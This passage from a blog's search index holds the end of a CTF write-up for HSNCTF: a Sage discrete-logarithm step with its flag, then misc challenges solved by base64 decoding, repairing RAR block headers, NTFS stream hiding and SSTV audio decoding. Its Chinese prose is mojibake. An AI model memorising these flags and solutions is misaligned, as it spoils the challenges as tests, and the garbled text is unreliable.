class="hljs-attribute">c</span>=889007651662506403203783493267282257215988729179620082971032093479384814992266823808192587257794931781622242482548202684315610166947125782056641835890542545830029903217817561269310184963519900268026434414254409767043528083064767018130469968738966212268513325090645430187706207887862845389628550171196492124556219364186293306935140349363837175430616647997752033400818089096772569695030947505437436792691260570218211502426593061096955991144063055944016658538765609416477033433728682889456364449301289731877176395077152830024245111711011732884071448942050549470148093802410710200714874231484059368826458031775976862475L<br>sage: discrete_log(c,g)<br>567361900135895770360389450735093365969913930365<br><br><span class="hljs-comment">#cac3408d5a83a64010b&#125;</span><br></code></pre></td></tr></table></figure><p>HSNCTF{015f0d60fab48cac3408d5a83a64010b}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><p>ç­¾åˆ°é¢˜ç›´æ¥å…¬ä¼—å·ç­¾åˆ°è·å¾—flag</p><h3 id="å¤–æ˜Ÿç”µæ³¢"><a href="#å¤–æ˜Ÿç”µæ³¢" class="headerlink" title="å¤–æ˜Ÿç”µæ³¢~"></a>å¤–æ˜Ÿç”µæ³¢~</h3><p>flag.zip ä¸­å‘ç° flag.rar ä¸­å‘ç° flag.txt</p><p>æ˜æ˜¾çš„base64ï¼Œè§£ç åå‘ç°PKå¼€å¤´ï¼Œä¿å­˜ä¸ºdownload.zip</p><p>download.zipä¸­å­˜åœ¨key.txtï¼Œä½†éœ€è¦å¯†ç ã€‚</p><p>ä¹‹å‰å°±å‘ç°flag.raræœ‰2.36Mä½†æ˜¯èƒ½çœ‹åˆ°çš„å†…å®¹ä¹‹åflag.txtï¼Œå¤§å°ä¸ä¸€è‡´ï¼Œæ€€ç–‘éšè—ä¸œè¥¿äº†</p><p>å°†rarçš„æ–‡ä»¶å¤´æ”¹æˆ0x74ï¼Œè¡¨ç¤ºæ–‡ä»¶å—ï¼Œæ‰å¯ä»¥æ­£ç¡®æ˜¾ç¤ºæ–‡ä»¶ï¼ˆæ”¹äº†å¥½å‡ ä¸ªï¼‰</p><p><img src="https://img.katck.com/images/2023/01/15/005964f4538d87cb374d6e1a809ec795.png" alt="005964f4538d87cb374d6e1a809ec795.png" style="zoom:67%;" /></p><p>ä¹‹åå¯ä»¥åœ¨å‹ç¼©åŒ…ä¸­æŸ¥çœ‹åˆ°ACLå’ŒSTMä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://img.katck.com/images/2023/01/15/8d24add3c1d285a1c83e12d068101492.png" alt="8d24add3c1d285a1c83e12d068101492.png" style="zoom: 50%;" /></p><p>åæ¥å‘ç°NTFSéšå†™ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><img src="https://img.katck.com/images/2023/01/15/f599e49329e00302da52eeede036020b.png" alt="f599e49329e00302da52eeede036020b.png" style="zoom: 50%;" /></p><p>é€šè¿‡010 editoræŸ¥çœ‹å‘ç°STMæ˜¯ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œæ”¹åç¼€åæ‰“å¼€å¬äº†åƒæ˜¯å«æ˜Ÿä¿¡å·ï¼Œç»“åˆé¢˜ç›®ã€‚ç›´æ¥ä½¿ç”¨RX-SSTVå¼€å§‹å¬</p><p><img src="https://img.katck.com/images/2023/01/15/6fab5491d5a9758ef38f8cd05eb232eb.png" alt="6fab5491d5a9758ef38f8cd05eb232eb.png" style="zoom:50%;" /></p><p>è·å¾—ç–‘ä¼¼å¯†ç çš„ä¸œè¥¿ï¼Œæƒ³åˆ°ä¹‹å‰key.txtéœ€è¦å¯†ç ï¼Œè·å¾—flag</p><p><img src="https://img.katck.com/images/2023/01/15/74cb65ee6ad22186dcde691c70f7dad4.png" alt="74cb65ee6ad22186dcde691c70f7dad4.png" style="zoom:50%;" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
